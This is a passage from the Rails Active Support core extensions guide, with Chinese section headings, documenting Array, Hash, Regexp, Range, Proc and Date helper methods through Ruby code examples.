定义于 active_support/core_ext/array/prepend_and_append.rb.

####  10.3 Options Extraction  抽取选项

When the last argument in a method call is a hash, except perhaps for a &block argument, Ruby allows you to omit the brackets:
User.exists?(email: params[:email])

That syntactic sugar is used a lot in Rails to avoid positional arguments where there would be too many, offering instead interfaces that emulate named parameters. In particular it is very idiomatic to use a trailing hash for options.

If a method expects a variable number of arguments and uses * in its declaration, however, such an options hash ends up being an item of the array of arguments, where it loses its role.

In those cases, you may give an options hash a distinguished treatment with extract_options!. This method checks the type of the last item of an array. If it is a hash it pops it and returns it, otherwise it returns an empty hash.

Let's see for example the definition of the caches_action controller macro:
def caches_action(*actions)
  return unless cache_configured?
  options = actions.extract_options!
  ...
end

This method receives an arbitrary number of action names, and an optional hash of options as last argument. With the call to extract_options! you obtain the options hash and remove it from actions in a simple and explicit way.

定义于 active_support/core_ext/array/extract_options.rb.

###  10.4 Conversions  类的转换
####  10.4.1 to_sentence 转为字符串句子

The method to_sentence turns an array into a string containing a sentence that enumerates its items:
%w().to_sentence                # => ""
%w(Earth).to_sentence           # => "Earth"
%w(Earth Wind).to_sentence      # => "Earth and Wind"
%w(Earth Wind Fire).to_sentence # => "Earth, Wind, and Fire"

This method accepts three options:

    :two_words_connector: What is used for arrays of length 2. Default is " and ".
    :words_connector: What is used to join the elements of arrays with 3 or more elements, except for the last two. Default is ", ".
    :last_word_connector: What is used to join the last items of an array with 3 or more elements. Default is ", and ".

The defaults for these options can be localized, their keys are:
Option 	I18n key
:two_words_connector 	support.array.two_words_connector
:words_connector 	support.array.words_connector
:last_word_connector 	support.array.last_word_connector

定义于 active_support/core_ext/array/conversions.rb.
####  10.4.2 to_formatted_s 转为格式化的字符串

The method to_formatted_s acts like to_s by default.

If the array contains items that respond to id, however, the symbol :db may be passed as argument. That's typically used with collections of Active Record objects. Returned strings are:
[].to_formatted_s(:db)            # => "null"
[user].to_formatted_s(:db)        # => "8456"
invoice.lines.to_formatted_s(:db) # => "23,567,556,12"

Integers in the example above are supposed to come from the respective calls to id.

定义于 active_support/core_ext/array/conversions.rb.

####  10.4.3 to_xml 转为xml

The method to_xml returns a string containing an XML representation of its receiver:
Contributor.limit(2).order(:rank).to_xml
# =>
# <?xml version="1.0" encoding="UTF-8"?>
# <contributors type="array">
#   <contributor>
#     <id type="integer">4356</id>
#     <name>Jeremy Kemper</name>
#     <rank type="integer">1</rank>
#     <url-id>jeremy-kemper</url-id>
#   </contributor>
#   <contributor>
#     <id type="integer">4404</id>
#     <name>David Heinemeier Hansson</name>
#     <rank type="integer">2</rank>
#     <url-id>david-heinemeier-hansson</url-id>
#   </contributor>
# </contributors>

To do so it sends to_xml to every item in turn, and collects the results under a root node. All items must respond to to_xml, an exception is raised otherwise.

By default, the name of the root element is the underscorized and dasherized plural of the name of the class of the first item, provided the rest of elements belong to that type (checked with is_a?) and they are not hashes. In the example above that's "contributors".

If there's any element that does not belong to the type of the first one the root node becomes "objects":
[Contributor.first, Commit.first].to_xml
# =>
# <?xml version="1.0" encoding="UTF-8"?>
# <objects type="array">
#   <object>
#     <id type="integer">4583</id>
#     <name>Aaron Batalion</name>
#     <rank type="integer">53</rank>
#     <url-id>aaron-batalion</url-id>
#   </object>
#   <object>
#     <author>Joshua Peek</author>
#     <authored-timestamp type="datetime">2009-09-02T16:44:36Z</authored-timestamp>
#     <branch>origin/master</branch>
#     <committed-timestamp type="datetime">2009-09-02T16:44:36Z</committed-timestamp>
#     <committer>Joshua Peek</committer>
#     <git-show nil="true"></git-show>
#     <id type="integer">190316</id>
#     <imported-from-svn type="boolean">false</imported-from-svn>
#     <message>Kill AMo observing wrap_with_notifications since ARes was only using it</message>
#     <sha1>723a47bfb3708f968821bc969a9a3fc873a3ed58</sha1>
#   </object>
# </objects>

If the receiver is an array of hashes the root element is by default also "objects":
[{a: 1, b: 2}, {c: 3}].to_xml
# =>
# <?xml version="1.0" encoding="UTF-8"?>
# <objects type="array">
#   <object>
#     <b type="integer">2</b>
#     <a type="integer">1</a>
#   </object>
#   <object>
#     <c type="integer">3</c>
#   </object>
# </objects>

If the collection is empty the root element is by default "nil-classes". That's a gotcha, for example the root element of the list of contributors above would not be "contributors" if the collection was empty, but "nil-classes". You may use the :root option to ensure a consistent root element.

The name of children nodes is by default the name of the root node singularized. In the examples above we've seen "contributor" and "object". The option :children allows you to set these node names.

The default XML builder is a fresh instance of Builder::XmlMarkup. You can configure your own builder via the :builder option. The method also accepts options like :dasherize and friends, they are forwarded to the builder:
Contributor.limit(2).order(:rank).to_xml(skip_types: true)
# =>
# <?xml version="1.0" encoding="UTF-8"?>
# <contributors>
#   <contributor>
#     <id>4356</id>
#     <name>Jeremy Kemper</name>
#     <rank>1</rank>
#     <url-id>jeremy-kemper</url-id>
#   </contributor>
#   <contributor>
#     <id>4404</id>
#     <name>David Heinemeier Hansson</name>
#     <rank>2</rank>
#     <url-id>david-heinemeier-hansson</url-id>
#   </contributor>
# </contributors>

定义于 active_support/core_ext/array/conversions.rb.
###  10.5 Wrapping 封装

The method Array.wrap wraps its argument in an array unless it is already an array (or array-like).

Specifically:

    If the argument is nil an empty list is returned.
    Otherwise, if the argument responds to to_ary it is invoked, and if the value of to_ary is not nil, it is returned.
    Otherwise, an array with the argument as its single element is returned.

Array.wrap(nil)       # => []
Array.wrap([1, 2, 3]) # => [1, 2, 3]
Array.wrap(0)         # => [0]

This method is similar in purpose to Kernel#Array, but there are some differences:

    If the argument responds to to_ary the method is invoked. Kernel#Array moves on to try to_a if the returned value is nil, but Array.wrap returns nil right away.
    If the returned value from to_ary is neither nil nor an Array object, Kernel#Array raises an exception, while Array.wrap does not, it just returns the value.
    It does not call to_a on the argument, though special-cases nil to return an empty array.

The last point is particularly worth comparing for some enumerables:
Array.wrap(foo: :bar) # => [{:foo=>:bar}]
Array(foo: :bar)      # => [[:foo, :bar]]

There's also a related idiom that uses the splat operator:
[*object]

which in Ruby 1.8 returns [nil] for nil, and calls to Array(object) otherwise. (Please if you know the exact behavior in 1.9 contact fxn.)

Thus, in this case the behavior is different for nil, and the differences with Kernel#Array explained above apply to the rest of objects.

定义于 active_support/core_ext/array/wrap.rb.
###  10.6 Duplicating  重制自身

The method Array.deep_dup duplicates itself and all objects inside recursively with Active Support method Object#deep_dup. It works like Array#map with sending deep_dup method to each object inside.
array = [1, [2, 3]]
dup = array.deep_dup
dup[1][2] = 4
array[1][2] == nil   # => true

定义于 active_support/core_ext/object/deep_dup.rb.
###  10.7 Grouping  分组
10.7.1 in_groups_of(number, fill_with = nil) 按个数分组

The method in_groups_of splits an array into consecutive groups of a certain size. It returns an array with the groups:
[1, 2, 3].in_groups_of(2) # => [[1, 2], [3, nil]]

or yields them in turn if a block is passed:
<% sample.in_groups_of(3) do |a, b, c| %>
  <tr>
    <td><%= a %></td>
    <td><%= b %></td>
    <td><%= c %></td>
  </tr>
<% end %>

The first example shows in_groups_of fills the last group with as many nil elements as needed to have the requested size. You can change this padding value using the second optional argument:
[1, 2, 3].in_groups_of(2, 0) # => [[1, 2], [3, 0]]

And you can tell the method not to fill the last group passing false:
[1, 2, 3].in_groups_of(2, false) # => [[1, 2], [3]]

As a consequence false can't be a used as a padding value.

定义于 active_support/core_ext/array/grouping.rb.
10.7.2 in_groups(number, fill_with = nil) 按组数分组

The method in_groups splits an array into a certain number of groups. The method returns an array with the groups:
%w(1 2 3 4 5 6 7).in_groups(3)
# => [["1", "2", "3"], ["4", "5", nil], ["6", "7", nil]]

or yields them in turn if a block is passed:
%w(1 2 3 4 5 6 7).in_groups(3) {|group| p group}
["1", "2", "3"]
["4", "5", nil]
["6", "7", nil]

The examples above show that in_groups fills some groups with a trailing nil element as needed. A group can get at most one of these extra elements, the rightmost one if any. And the groups that have them are always the last ones.

You can change this padding value using the second optional argument:
%w(1 2 3 4 5 6 7).in_groups(3, "0")
# => [["1", "2", "3"], ["4", "5", "0"], ["6", "7", "0"]]

And you can tell the method not to fill the smaller groups passing false:
%w(1 2 3 4 5 6 7).in_groups(3, false)
# => [["1", "2", "3"], ["4", "5"], ["6", "7"]]

As a consequence false can't be a used as a padding value.

定义于 active_support/core_ext/array/grouping.rb.
10.7.3 split(value = nil) 按某标准分组

The method split divides an array by a separator and returns the resulting chunks.

If a block is passed the separators are those elements of the array for which the block returns true:
(-5..5).to_a.split { |i| i.multiple_of?(4) }
# => [[-5], [-3, -2, -1], [1, 2, 3], [5]]

Otherwise, the value received as argument, which defaults to nil, is the separator:
[0, 1, -5, 1, 1, "foo", "bar"].split(1)
# => [[0], [-5], [], ["foo", "bar"]]

Observe in the previous example that consecutive separators result in empty arrays.

定义于 active_support/core_ext/array/grouping.rb.
##  11 Extensions to Hash 对散列的扩展
###  11.1 Conversions 转换类型
11.1.1 to_xml

The method to_xml returns a string containing an XML representation of its receiver:
{"foo" => 1, "bar" => 2}.to_xml
# =>
# <?xml version="1.0" encoding="UTF-8"?>
# <hash>
#   <foo type="integer">1</foo>
#   <bar type="integer">2</bar>
# </hash>

To do so, the method loops over the pairs and builds nodes that depend on the values. Given a pair key, value:

    If value is a hash there's a recursive call with key as :root.

    If value is an array there's a recursive call with key as :root, and key singularized as :children.

    If value is a callable object it must expect one or two arguments. Depending on the arity, the callable is invoked with the options hash as first argument with key as :root, and key singularized as second argument. Its return value becomes a new node.

    If value responds to to_xml the method is invoked with key as :root.

    Otherwise, a node with key as tag is created with a string representation of value as text node. If value is nil an attribute "nil" set to "true" is added. Unless the option :skip_types exists and is true, an attribute "type" is added as well according to the following mapping:

XML_TYPE_NAMES = {
  "Symbol"     => "symbol",
  "Fixnum"     => "integer",
  "Bignum"     => "integer",
  "BigDecimal" => "decimal",
  "Float"      => "float",
  "TrueClass"  => "boolean",
  "FalseClass" => "boolean",
  "Date"       => "date",
  "DateTime"   => "datetime",
  "Time"       => "datetime"
}

By default the root node is "hash", but that's configurable via the :root option.

The default XML builder is a fresh instance of Builder::XmlMarkup. You can configure your own builder with the :builder option. The method also accepts options like :dasherize and friends, they are forwarded to the builder.

定义于 active_support/core_ext/hash/conversions.rb.
###  11.2 Merging  合并

Ruby has a built-in method Hash#merge that merges two hashes:
{a: 1, b: 1}.merge(a: 0, c: 2)
# => {:a=>0, :b=>1, :c=>2}

Active Support defines a few more ways of merging hashes that may be convenient.
11.2.1 reverse_merge and reverse_merge! 反向合并

In case of collision the key in the hash of the argument wins in merge. You can support option hashes with default values in a compact way with this idiom:
options = {length: 30, omission: "..."}.merge(options)

Active Support defines reverse_merge in case you prefer this alternative notation:
options = options.reverse_merge(length: 30, omission: "...")

And a bang version reverse_merge! that performs the merge in place:
options.reverse_merge!(length: 30, omission: "...")

Take into account that reverse_merge! may change the hash in the caller, which may or may not be a good idea.

定义于 active_support/core_ext/hash/reverse_merge.rb.
11.2.2 reverse_update 反向更新

The method reverse_update is an alias for reverse_merge!, explained above.

Note that reverse_update has no bang.

定义于 active_support/core_ext/hash/reverse_merge.rb.
11.2.3 deep_merge and deep_merge! 深度合并

As you can see in the previous example if a key is found in both hashes the value in the one in the argument wins.

Active Support defines Hash#deep_merge. In a deep merge, if a key is found in both hashes and their values are hashes in turn, then their merge becomes the value in the resulting hash:
{a: {b: 1}}.deep_merge(a: {c: 2})
# => {:a=>{:b=>1, :c=>2}}

The method deep_merge! performs a deep merge in place.

定义于 active_support/core_ext/hash/deep_merge.rb.
###  11.3 Deep duplicating  深度复制

The method Hash.deep_dup duplicates itself and all keys and values inside recursively with Active Support method Object#deep_dup. It works like Enumerator#each_with_object with sending deep_dup method to each pair inside.
hash = { a: 1, b: { c: 2, d: [3, 4] } }
 
dup = hash.deep_dup
dup[:b][:e] = 5
dup[:b][:d] << 5
 
hash[:b][:e] == nil      # => true
hash[:b][:d] == [3, 4]   # => true

定义于 active_support/core_ext/object/deep_dup.rb.
###  11.4 Working with Keys  带键运作
11.4.1 except and except! 除了

The method except returns a hash with the keys in the argument list removed, if present:
{a: 1, b: 2}.except(:a) # => {:b=>2}

If the receiver responds to convert_key, the method is called on each of the arguments. This allows except to play nice with hashes with indifferent access for instance:
{a: 1}.with_indifferent_access.except(:a)  # => {}
{a: 1}.with_indifferent_access.except("a") # => {}

There's also the bang variant except! that removes keys in the very receiver.

定义于 active_support/core_ext/hash/except.rb.
11.4.2 transform_keys and transform_keys! 转换键

The method transform_keys accepts a block and returns a hash that has applied the block operations to each of the keys in the receiver:
{nil => nil, 1 => 1, a: :a}.transform_keys { |key| key.to_s.upcase }
# => {"" => nil, "A" => :a, "1" => 1}

In case of key collision, one of the values will be chosen. The chosen value may not always be the same given the same hash:
{"a" => 1, a: 2}.transform_keys { |key| key.to_s.upcase }
# The result could either be
# => {"A"=>2}
# or
# => {"A"=>1}

This method may be useful for example to build specialized conversions. For instance stringify_keys and symbolize_keys use transform_keys to perform their key conversions:
def stringify_keys
  transform_keys { |key| key.to_s }
end
...
def symbolize_keys
  transform_keys { |key| key.to_sym rescue key }
end

There's also the bang variant transform_keys! that applies the block operations to keys in the very receiver.

Besides that, one can use deep_transform_keys and deep_transform_keys! to perform the block operation on all the keys in the given hash and all the hashes nested into it. An example of the result is:
{nil => nil, 1 => 1, nested: {a: 3, 5 => 5}}.deep_transform_keys { |key| key.to_s.upcase }
# => {""=>nil, "1"=>1, "NESTED"=>{"A"=>3, "5"=>5}}

定义于 active_support/core_ext/hash/keys.rb.
11.4.3 stringify_keys and stringify_keys! 键的字符串化

The method stringify_keys returns a hash that has a stringified version of the keys in the receiver. It does so by sending to_s to them:
{nil => nil, 1 => 1, a: :a}.stringify_keys
# => {"" => nil, "a" => :a, "1" => 1}

In case of key collision, one of the values will be chosen. The chosen value may not always be the same given the same hash:
{"a" => 1, a: 2}.stringify_keys
# The result could either be
# => {"a"=>2}
# or
# => {"a"=>1}

This method may be useful for example to easily accept both symbols and strings as options. For instance ActionView::Helpers::FormHelper defines:
def to_check_box_tag(options = {}, checked_value = "1", unchecked_value = "0")
  options = options.stringify_keys
  options["type"] = "checkbox"
  ...
end

The second line can safely access the "type" key, and let the user to pass either :type or "type".

There's also the bang variant stringify_keys! that stringifies keys in the very receiver.

Besides that, one can use deep_stringify_keys and deep_stringify_keys! to stringify all the keys in the given hash and all the hashes nested into it. An example of the result is:
{nil => nil, 1 => 1, nested: {a: 3, 5 => 5}}.deep_stringify_keys
# => {""=>nil, "1"=>1, "nested"=>{"a"=>3, "5"=>5}}

定义于 active_support/core_ext/hash/keys.rb.
11.4.4 symbolize_keys and symbolize_keys! 键的符号化

The method symbolize_keys returns a hash that has a symbolized version of the keys in the receiver, where possible. It does so by sending to_sym to them:
{nil => nil, 1 => 1, "a" => "a"}.symbolize_keys
# => {1=>1, nil=>nil, :a=>"a"}

Note in the previous example only one key was symbolized.

In case of key collision, one of the values will be chosen. The chosen value may not always be the same given the same hash:
{"a" => 1, a: 2}.symbolize_keys
# The result could either be
# => {:a=>2}
# or
# => {:a=>1}

This method may be useful for example to easily accept both symbols and strings as options. For instance ActionController::UrlRewriter defines
def rewrite_path(options)
  options = options.symbolize_keys
  options.update(options[:params].symbolize_keys) if options[:params]
  ...
end

The second line can safely access the :params key, and let the user to pass either :params or "params".

There's also the bang variant symbolize_keys! that symbolizes keys in the very receiver.

Besides that, one can use deep_symbolize_keys and deep_symbolize_keys! to symbolize all the keys in the given hash and all the hashes nested into it. An example of the result is:
{nil => nil, 1 => 1, "nested" => {"a" => 3, 5 => 5}}.deep_symbolize_keys
# => {nil=>nil, 1=>1, nested:{a:3, 5=>5}}

定义于 active_support/core_ext/hash/keys.rb.
11.4.5 to_options and to_options! 键转为选项

The methods to_options and to_options! are respectively aliases of symbolize_keys and symbolize_keys!.

定义于 active_support/core_ext/hash/keys.rb.
11.4.6 assert_valid_keys 诊断有效键

The method assert_valid_keys receives an arbitrary number of arguments, and checks whether the receiver has any key outside that white list. If it does ArgumentError is raised.
{a: 1}.assert_valid_keys(:a)  # passes
{a: 1}.assert_valid_keys("a") # ArgumentError

Active Record does not accept unknown options when building associations, for example. It implements that control via assert_valid_keys.

定义于 active_support/core_ext/hash/keys.rb.
###  11.5 Slicing  切片

Ruby has built-in support for taking slices out of strings and arrays. Active Support extends slicing to hashes:
{a: 1, b: 2, c: 3}.slice(:a, :c)
# => {:c=>3, :a=>1}
 
{a: 1, b: 2, c: 3}.slice(:b, :X)
# => {:b=>2} # non-existing keys are ignored

If the receiver responds to convert_key keys are normalized:
{a: 1, b: 2}.with_indifferent_access.slice("a")
# => {:a=>1}

Slicing may come in handy for sanitizing option hashes with a white list of keys.

There's also slice! which in addition to perform a slice in place returns what's removed:
hash = {a: 1, b: 2}
rest = hash.slice!(:a) # => {:b=>2}
hash                   # => {:a=>1}

定义于 active_support/core_ext/hash/slice.rb.
###  11.6 Extracting    抽取

The method extract! removes and returns the key/value pairs matching the given keys.
hash = {a: 1, b: 2}
rest = hash.extract!(:a) # => {:a=>1}
hash                     # => {:b=>2}

The method extract! returns the same subclass of Hash, that the receiver is.
hash = {a: 1, b: 2}.with_indifferent_access
rest = hash.extract!(:a).class
# => ActiveSupport::HashWithIndifferentAccess

定义于 active_support/core_ext/hash/slice.rb.
###  11.7 Indifferent Access   无谓访问

The method with_indifferent_access returns an ActiveSupport::HashWithIndifferentAccess out of its receiver:
{a: 1}.with_indifferent_access["a"] # => 1

定义于 active_support/core_ext/hash/indifferent_access.rb.
###  11.8    Compact      紧凑

The methods compact and compact! return a Hash without items with nil value.
{a: 1, b: 2, c: nil}.compact # => {a: 1, b: 2}

定义于 active_support/core_ext/hash/compact.rb.
##  12 Extensions to Regexp 对正则表达式的扩展
###  12.1 multiline? 是否多行

The method multiline? says whether a regexp has the /m flag set, that is, whether the dot matches newlines.
%r{.}.multiline?  # => false
%r{.}m.multiline? # => true
 
Regexp.new('.').multiline?                    # => false
Regexp.new('.', Regexp::MULTILINE).multiline? # => true

Rails uses this method in a single place, also in the routing code. Multiline regexps are disallowed for route requirements and this flag eases enforcing that constraint.
def assign_route_options(segments, defaults, requirements)
  ...
  if requirement.multiline?
    raise ArgumentError, "Regexp multiline option not allowed in routing requirements: #{requirement.inspect}"
  end
  ...
end

定义于 active_support/core_ext/regexp.rb.
##  13 Extensions to Range 对范围的扩展
###  13.1 to_s 转为字符串

Active Support extends the method Range#to_s so that it understands an optional format argument. As of this writing the only supported non-default format is :db:
(Date.today..Date.tomorrow).to_s
# => "2009-10-25..2009-10-26"
 
(Date.today..Date.tomorrow).to_s(:db)
# => "BETWEEN '2009-10-25' AND '2009-10-26'"

As the example depicts, the :db format generates a BETWEEN SQL clause. That is used by Active Record in its support for range values in conditions.

定义于 active_support/core_ext/range/conversions.rb.
###  13.2 include? 是否包含

The methods Range#include? and Range#=== say whether some value falls between the ends of a given instance:
(2..3).include?(Math::E) # => true

Active Support extends these methods so that the argument may be another range in turn. In that case we test whether the ends of the argument range belong to the receiver themselves:
(1..10).include?(3..7)  # => true
(1..10).include?(0..7)  # => false
(1..10).include?(3..11) # => false
(1...9).include?(3..9)  # => false
 
(1..10) === (3..7)  # => true
(1..10) === (0..7)  # => false
(1..10) === (3..11) # => false
(1...9) === (3..9)  # => false

定义于 active_support/core_ext/range/include_range.rb.
###  13.3 overlaps? 是否超出范围

The method Range#overlaps? says whether any two given ranges have non-void intersection:
(1..10).overlaps?(7..11)  # => true
(1..10).overlaps?(0..7)   # => true
(1..10).overlaps?(11..27) # => false

定义于 active_support/core_ext/range/overlaps.rb.
##  14 Extensions to Proc 对过程的扩展
###  14.1 bind 绑定

As you surely know Ruby has an UnboundMethod class whose instances are methods that belong to the limbo of methods without a self. The method Module#instance_method returns an unbound method for example:
Hash.instance_method(:delete) # => #<UnboundMethod: Hash#delete>

An unbound method is not callable as is, you need to bind it first to an object with bind:
clear = Hash.instance_method(:clear)
clear.bind({a: 1}).call # => {}

Active Support defines Proc#bind with an analogous purpose:
Proc.new { size }.bind([]).call # => 0

As you see that's callable and bound to the argument, the return value is indeed a Method.

To do so Proc#bind actually creates a method under the hood. If you ever see a method with a weird name like __bind_1256598120_237302 in a stack trace you know now where it comes from.

Action Pack uses this trick in rescue_from for example, which accepts the name of a method and also a proc as callbacks for a given rescued exception. It has to call them in either case, so a bound method is returned by handler_for_rescue, thus simplifying the code in the caller:
def handler_for_rescue(exception)
  _, rescuer = Array(rescue_handlers).reverse.detect do |klass_name, handler|
    ...
  end
 
  case rescuer
  when Symbol
    method(rescuer)
  when Proc
    rescuer.bind(self)
  end
end

定义于 active_support/core_ext/proc.rb.
##  15 Extensions to Date 对日期的扩展
###  15.1 Calculations    计算

All the following methods are defined in active_support/core_ext/date/calculations.rb.

The following calculation methods have edge cases in October 1582, since days 5..14 just do not exist. This guide does not document their behavior around those days for brevity, but it is enough to say that they do what you would expect. That is, Date.new(1582, 10, 4).tomorrow returns Date.new(1582, 10, 15) and so on. Please check test/core_ext/date_ext_test.rb in the Active Support test suite for expected behavior.
15.1.1 Date.current 当前日期

Active Support defines Date.current to be today in the current time zone. That's like Date.today, except that it honors the user time zone, if defined. It also defines Date.yesterday and Date.tomorrow, and the instance predicates past?, today?, and future?, all of them relative to Date.current.

When making Date comparisons using methods which honor the user time zone, make sure to use Date.current and not Date.today. There are cases where the user time zone might be in the future compared to the system time zone, which Date.today uses by default. This means Date.today may equal Date.yesterday.
15.1.2 Named dates  已命名日期
#####  15.1.2.1 prev_year, next_year 前一年，后一年

In Ruby 1.9 prev_year and next_year return a date with the same day/month in the last or next year:
d = Date.new(2010, 5, 8) # => Sat, 08 May 2010
d.prev_year              # => Fri, 08 May 2009
d.next_year              # => Sun, 08 May 2011

If date is the 29th of February of a leap year, you obtain the 28th:
d = Date.new(2000, 2, 29) # => Tue, 29 Feb 2000
d.prev_year               # => Sun, 28 Feb 1999
d.next_year               # => Wed, 28 Feb 2001

prev_year is aliased to last_year.
#####  15.1.2.2 prev_month, next_month  前一月，后一月

In Ruby 1.9 prev_month and next_month return the date with the same day in the last or next month:
d = Date.new(2010, 5, 8) # => Sat, 08 May 2010
d.prev_month             # => Thu, 08 Apr 2010
d.next_month             # => Tue, 08 Jun 2010

If such a day does not exist, the last day of the corresponding month is returned:
Date.new(2000, 5, 31).prev_month # => Sun, 30 Apr 2000
Date.new(2000, 3, 31).prev_month # => Tue, 29 Feb 2000
Date.new(2000, 5, 31).next_month # => Fri, 30 Jun 2000
Date.new(2000, 1, 31).next_month # => Tue, 29 Feb 2000

prev_month is aliased to last_month.
#####  15.1.2.3 prev_quarter, next_quarter 前一季，后一季

Same as prev_month and next_month. It returns the date with the same day in the previous or next quarter:
t = Time.local(2010, 5, 8) # => Sat, 08 May 2010
t.prev_quarter             # => Mon, 08 Feb 2010
t.next_quarter             # => Sun, 08 Aug 2010

If such a day does not exist, the last day of the corresponding month is returned:
Time.local(2000, 7, 31).prev_quarter  # => Sun, 30 Apr 2000
Time.local(2000, 5, 31).prev_quarter  # => Tue, 29 Feb 2000
Time.local(2000, 10, 31).prev_quarter # => Mon, 30 Oct 2000
Time.local(2000, 11, 31).next_quarter # => Wed, 28 Feb 2001

prev_quarter is aliased to last_quarter.
#####  15.1.2.4 beginning_of_week, end_of_week 一周开始，一周结束

The methods beginning_of_week and end_of_week return the dates for the beginning and end of the week, respectively. Weeks are assumed to start on Monday, but that can be changed passing an argument, setting thread local Date.beginning_of_week or config.beginning_of_week.
d = Date.new(2010, 5, 8)     # => Sat, 08 May 2010
d.beginning_of_week          # => Mon, 03 May 2010
d.beginning_of_week(:sunday) # => Sun, 02 May 2010
d.end_of_week                # => Sun, 09 May 2010
d.end_of_week(:sunday)       # => Sat, 08 May 2010

beginning_of_week is aliased to at_beginning_of_week and end_of_week is aliased to at_end_of_week.
#####  15.1.2.5 monday, sunday 周一，周日

The methods monday and sunday return the dates for the previous Monday and next Sunday, respectively.
d = Date.new(2010, 5, 8)     # => Sat, 08 May 2010
d.monday                     # => Mon, 03 May 2010
d.sunday                     # => Sun, 09 May 2010
 
d = Date.new(2012, 9, 10)    # => Mon, 10 Sep 2012
d.monday                     # => Mon, 10 Sep 2012
 
d = Date.new(2012, 9, 16)    # => Sun, 16 Sep 2012
d.sunday                     # => Sun, 16 Sep 2012
#####  15.1.2.6 prev_week, next_week 前一周，后一周

The method next_week receives a symbol with a day name in English (default is the thread local Date.beginning_of_week, or config.beginning_of_week, or :monday) and it returns the date corresponding to that day.
d = Date.new(2010, 5, 9) # => Sun, 09 May 2010
d.next_week              # => Mon, 10 May 2010
d.next_week(:saturday)   # => Sat, 15 May 2010

The method prev_week is analogous:
d.prev_week              # => Mon, 26 Apr 2010
d.prev_week(:saturday)   # => Sat, 01 May 2010
d.prev_week(:friday)     # => Fri, 30 Apr 2010

prev_week is aliased to last_week.

Both next_week and prev_week work as expected when Date.beginning_of_week or config.beginning_of_week are set.
#####  15.1.2.7 beginning_of_month, end_of_month 月头和月尾

The methods beginning_of_month and end_of_month return the dates for the beginning and end of the month:
d = Date.new(2010, 5, 9) # => Sun, 09 May 2010
d.beginning_of_month     # => Sat, 01 May 2010
d.end_of_month           # => Mon, 31 May 2010

beginning_of_month is aliased to at_beginning_of_month, and end_of_month is aliased to at_end_of_month.
#####  15.1.2.8 beginning_of_quarter, end_of_quarter 季头和季尾

The methods beginning_of_quarter and end_of_quarter return the dates for the beginning and end of the quarter of the receiver's calendar year:
d = Date.new(2010, 5, 9) # => Sun, 09 May 2010
d.beginning_of_quarter   # => Thu, 01 Apr 2010
d.end_of_quarter         # => Wed, 30 Jun 2010

beginning_of_quarter is aliased to at_beginning_of_quarter, and end_of_quarter is aliased to at_end_of_quarter.
#####  15.1.2.9 beginning_of_year, end_of_year 年头，年尾

The methods beginning_of_year and end_of_year return the dates for the beginning and end of the year:
d = Date.new(2010, 5, 9) # => Sun, 09 May 2010
d.beginning_of_year      # => Fri, 01 Jan 2010
d.end_of_year            # => Fri, 31 Dec 2010

beginning_of_year is aliased to at_beginning_of_year, and end_of_year is aliased to at_end_of_year.
15.1.3 Other Date Computations  其他日期计算
#####  15.1.3.1 years_ago, years_since 几年前

The method years_ago receives a number of years and returns the same date those many years ago:
date = Date.new(2010, 6, 7)
date.years_ago(10) # => Wed, 07 Jun 2000

years_since moves forward in time:
date = Date.new(2010, 6, 7)
date.years_since(10) # => Sun, 07 Jun 2020

If such a day does not exist, the last day of the corresponding month is returned:
Date.new(2012, 2, 29).years_ago(3)     # => Sat, 28 Feb 2009
Date.new(2012, 2, 29).years_since(3)   # => Sat, 28 Feb 2015
#####  15.1.3.2 months_ago, months_since 几个月前

The methods months_ago and months_since work analogously for months:
Date.new(2010, 4, 30).months_ago(2)   # => Sun, 28 Feb 2010
Date.new(2010, 4, 30).months_since(2) # => Wed, 30 Jun 2010

If such a day does not exist, the last day of the corresponding month is returned:
Date.new(2010, 4, 30).months_ago(2)    # => Sun, 28 Feb 2010
Date.new(2009, 12, 31).months_since(2) # => Sun, 28 Feb 2010
#####  15.1.3.3 weeks_ago 几周前

The method weeks_ago works analogously for weeks:
Date.new(2010, 5, 24).weeks_ago(1)    # => Mon, 17 May 2010
Date.new(2010, 5, 24).weeks_ago(2)    # => Mon, 10 May 2010
#####  15.1.3.4 advance 更高级用法

The most generic way to jump to other days is advance. This method receives a hash with keys :years, :months, :weeks, :days, and returns a date advanced as much as the present keys indicate:
date = Date.new(2010, 6, 6)
date.advance(years: 1, weeks: 2)  # => Mon, 20 Jun 2011
date.advance(months: 2, days: -2) # => Wed, 04 Aug 2010

Note in the previous example that increments may be negative.

To perform the computation the method first increments years, then months, then weeks, and finally days. This order is important towards the end of months. Say for example we are at the end of February of 2010, and we want to move one month and one day forward.

The method advance advances first one month, and then one day, the result is:
Date.new(2010, 2, 28).advance(months: 1, days: 1)
# => Sun, 29 Mar 2010

While if it did it the other way around the result would be different:
Date.new(2010, 2, 28).advance(days: 1).advance(months: 1)
# => Thu, 01 Apr 2010
15.1.4 Changing Components  改变部分数据

The method change allows you to get a new date which is the same as the receiver except for the given year, month, or day:
Date.new(2010, 12, 23).change(year: 2011, month: 11)
# => Wed, 23 Nov 2011

This method is not tolerant to non-existing dates, if the change is invalid ArgumentError is raised:
Date.new(2010, 1, 31).change(month: 2)
# => ArgumentError: invalid date
15.1.5 Durations 期间

Durations can be added to and subtracted from dates:
d = Date.current
# => Mon, 09 Aug 2010
d + 1.year
# => Tue, 09 Aug 2011
d - 3.hours
# => Sun, 08 Aug 2010 21:00:00 UTC +00:00

They translate to calls to since or advance. For example here we get the correct jump in the calendar reform:
Date.new(1582, 10, 4) + 1.day
# => Fri, 15 Oct 1582
15.1.6 Timestamps  时间戳

The following methods return a Time object if possible, otherwise a DateTime. If set, they honor the user time zone.
#####  15.1.6.1 beginning_of_day, end_of_day 一日开始，一日结束

The method beginning_of_day returns a timestamp at the beginning of the day (00:00:00):
date = Date.new(2010, 6, 7)
date.beginning_of_day # => Mon Jun 07 00:00:00 +0200 2010

The method end_of_day returns a timestamp at the end of the day (23:59:59):
date = Date.new(2010, 6, 7)
date.end_of_day # => Mon Jun 07 23:59:59 +0200 2010

beginning_of_day is aliased to at_beginning_of_day, midnight, at_midnight.
#####  15.1.6.2 beginning_of_hour, end_of_hour 一时开始，一时结束

The method beginning_of_hour returns a timestamp at the beginning of the hour (hh:00:00):
date = DateTime.new(2010, 6, 7, 19, 55, 25)
date.beginning_of_hour # => Mon Jun 07 19:00:00 +0200 2010

The method end_of_hour returns a timestamp at the end of the hour (hh:59:59):
date = DateTime.new(2010, 6, 7, 19, 55, 25)
date.end_of_hour # => Mon Jun 07 19:59:59 +0200 2010

beginning_of_hour is aliased to at_beginning_of_hour.
#####  15.1.6.3 beginning_of_minute, end_of_minute 一分开始，一分结束

The method beginning_of_minute returns a timestamp at the beginning of the minute (hh:mm:00):
